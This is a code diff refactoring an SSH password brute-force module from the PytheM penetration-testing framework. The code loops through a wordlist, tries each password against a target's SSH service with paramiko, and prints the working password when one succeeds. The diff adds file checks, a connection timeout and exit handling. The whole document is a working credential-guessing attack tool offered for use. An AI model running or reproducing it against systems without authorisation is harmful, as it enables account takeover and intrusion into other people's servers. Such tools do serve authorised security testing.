@@ -1,6 +1,5 @@
-#!/usr/bin/env python2.7
-#coding=UTF-8
-
+"""Part of the PytheM framework. """
+#
 # Copyright (c) 2016 Angelo Moura
 #
 # This file is part of the program PytheM
@@ -18,60 +17,97 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
-
-import paramiko
-# unused import of sys
-#   import sys
+#
+# === Change log:
+#
+# 2016, Aug 06, Bifrozt
+#   - Removed shebang from module
+#   - Minimized length of args
+#   - Verify that file object exists
+#   - Verify that user has read access to file object
+#   - Removed use of python builtin word: 'file' replaced with 'fobj'
+#   - Defined connection timeout (2 sec) for non responsive SSH server.
+#     Will return a tuple from try-except in ssh_connect() on timeout.
+#     Calls sys.exit(1) if timeout to SSH server occurs.
+#   - try-except in start() will check type before if-elif statements
+#   - Calls sys.exit(0) when correct password is found.
+#   - Removed try-except in start(). Not sure what exceptions this will be
+#     catching, except a possible KeyboardInterrupt?
+#
 import os
+import paramiko
+import sys
 import socket
+from os import R_OK
+
 
 
 class SSHbrutus(object):
-
+    """SSH brute force class. """
     name = "SSH Brute-forcer"
     desc = "Perform password brute-force on SSH"
     version = "0.1"
 
-    def __init__(self, target, username, fobj):
-        self.target = target
-        self.username = username
-        self.file = fobj
-        self.line = '\n{0}\n'.format(('-' * 67))
-
-        if os.path.exists(file) == False:
-            print "\n[!] Path to wordlist don't exist."
+    def __init__(self, trgt, usr, fobj):
+        self.trgt = trgt
+        self.usr = usr
+        self.fobj = fobj
 
 
-    def ssh_connect(self, password, code=0):
+    def exists(self):
+        """Tests if the file exists and if the executing user has read access
+        to the file. Returns file if both tests are passed. """
+        if not os.path.isfile(self.fobj):
+            print 'FileNotFound: {0}'.format(self.fobj)
+            sys.exit(1)
+
+        if not os.access(self.fobj, R_OK):
+            print 'DeniedReadAccess: {0}'.format(self.fobj)
+            sys.exit(1)
+
+        if os.path.isfile(self.fobj) and os.access(self.fobj, R_OK):
+            return self.fobj
+
+
+    def ssh_connect(self, passwd, code=0):
+        """Connects to the SSH server, attempts to authenticate and returns the
+        exit code from the attempt. """
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         try:
-            ssh.connect(self.target, port=22, username=self.username, password=password)
+            ssh.connect(self.trgt, port=22, username=self.usr, password=passwd, timeout=2)
         except paramiko.AuthenticationException:
             code = 1
-        except socket.error, e:
-            code = 2
+        except socket.error, err:
+            code = 2, err
+
         ssh.close()
         return code
 
+
     def start(self):
-        input_file = open(self.file)
-        print ""
-        for i in input_file.readlines():
-            password = i.strip("\n")
-            try:
-                response = self.ssh_connect(password)
-                if response == 0:
-                    print "{}[+] User: {} [+] Password found!: {}{}".format(self.line, self.username, password, self.line)
+        """Itterates trough the password list and checks wheter or not the
+        correct password has been found. """
+        fobj = self.exists()
+        wlist = open(fobj)
 
-                elif response == 1:
-                    print "[-] User: {} [-] Password: {} -->  [+]Incorrect[-]  <--".format(self.username, password)
+        for i in wlist.readlines():
+            passwd = i.strip("\n")
+            resp = self.ssh_connect(passwd)
 
-                elif response == 2:
-                    print "[!] Connection couldn't be established with the address: {}".format(self.target)
-            # Very broad exception catch, what are we trying to catch here?
-            except Exception, e:
-                print e
-                pass
-        input_file.close()
+            if type(resp) == int:
+
+                if resp == 0:
+                    print "[+] User: {0}".format(self.usr)
+                    print "[+] Password found!: {0}".format(passwd)
+                    sys.exit(0)
+
+                if resp == 1:
+                    print "[-] User: {0} Password: {1}".format(self.usr, passwd)
+
+            elif resp[0] == 2:
+                print "[!] {0}: {1}".format(resp[1], self.trgt)
+                sys.exit(1)
+
+        wlist.close()
